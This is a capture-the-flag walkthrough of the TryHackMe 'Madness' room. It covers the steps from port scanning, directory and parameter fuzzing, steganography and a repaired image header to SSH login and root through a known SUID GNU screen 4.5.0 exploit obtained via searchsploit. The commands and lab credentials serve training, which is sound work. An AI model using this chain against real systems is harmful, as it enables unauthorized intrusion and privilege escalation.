# TryHackMe: Madness Writeup

**Room Link:** [Madness](https://tryhackme.com/room/madness)

---

## Initial Enumeration

We start with an Nmap scan targeting our IP:

```bash
nmap 10.10.54.141
```

**Results:**
```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

The room description hints that SSH brute forcing is unnecessary.

Using `gobuster` to find hidden directories on HTTP:
```bash
gobuster dir -u 10.10.54.141 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

## Exploring Information Leaks

On the room's main description page, there is an image (`5iW7kC8.jpg`). Since this is a CTF, we should examine all provided media. Extracting data with `steghide`:

```bash
steghide --extract --stegofile 5iW7kC8.jpg
```
It gives us:
```text
I didn't think you'd find me! Congratulations!
Here take my password
*axA&GF8dP
```

Password obtained: `*axA&GF8dP`

## Web Exploitation

Viewing the source code of the main web page (`/index.php`), we spot a hidden comment:
```html
<!-- They will never find me-->
<img src="/thm.jpg">
```

However, `/thm.jpg` does not load correctly. Let's download it:
```bash
curl http://10.10.54.141/thm.jpg --output thm.jpg
```

Opening the file in a hex editor (`hexeditor thm.jpg` or GHex), we notice the file header is for a PNG, but the file extension is JPG. 
We can fix the image by changing the magic bytes to a valid JPEG header:
`FF D8 FF E0 00 10 4A 46 49 46`

After saving the hex modifications, the image loads perfectly and reveals a hidden directory: `/th1s_1s_h1dd3n`.

### Directory Brute Forcing a Parameter

Navigating to `http://10.10.54.141/th1s_1s_h1dd3n/`, we inspect the source code and find another hint:
```html
<!-- It's between 0-99 but I don't think anyone will look here-->
```

We try adding `?secret=0` to the URL. The page processes it but indicates it's the wrong secret. Rather than guessing manually, let's script it or just brute-force it with `gobuster`.

1. Generate a wordlist of 0 to 99:
```bash
for i in {0..99}; do echo $i >> 100nums.txt; done
```

2. Fuzz the parameter:
```bash
gobuster fuzz -u http://10.10.54.141/th1s_1s_h1dd3n/?secret=FUZZ -w 100nums.txt
```

By filtering by length, we notice that `73` produces a different length response than the rest. Inputting `?secret=73` gives us a string:
`y2RPJ4QaPF!B`

This is the password required to decode the original `thm.jpg` (or another image) that held the hidden directory! Decoding gives us:
```text
Fine you found the password! 
Here's a username 
wbxre
I didn't say I would make it easy for you!
```

`wbxre` is ROT13 encoded. Decoded it translates to `joker`.

## Initial Access (joker)

We now have valid SSH credentials:
- **Username:** `joker`
- **Password:** `*axA&GF8dP`

```bash
ssh joker@10.10.54.141
# ...
cat user.txt
```

User flag acquired! (redacted — solve the room to get the exact value)

## Privilege Escalation: joker -> root

To find escalation vectors, we can upload and run `LinEnum.sh` to the target.

```bash
scp exploits/LinEnum/LinEnum.sh joker@10.10.54.141:/home/joker
```

Running `LinEnum.sh` reveals a very interesting binary with the SUID bit set: `/bin/screen-4.5.0`.
This version has a known local privilege escalation vulnerability (**CVE-2017-5618**).

We use `searchsploit` to locate the exploit code:
```bash
searchsploit screen 4.5.0
searchsploit -m 41154.sh
```

We transfer the exploit over:
```bash
scp 41154.sh joker@10.10.54.141:/home/joker
```

Executing `41154.sh` safely escalates us to an interactive root prompt.

```bash
./41154.sh
# cat /root/root.txt
```
(Root flag redacted — solve the room to get the exact value.)
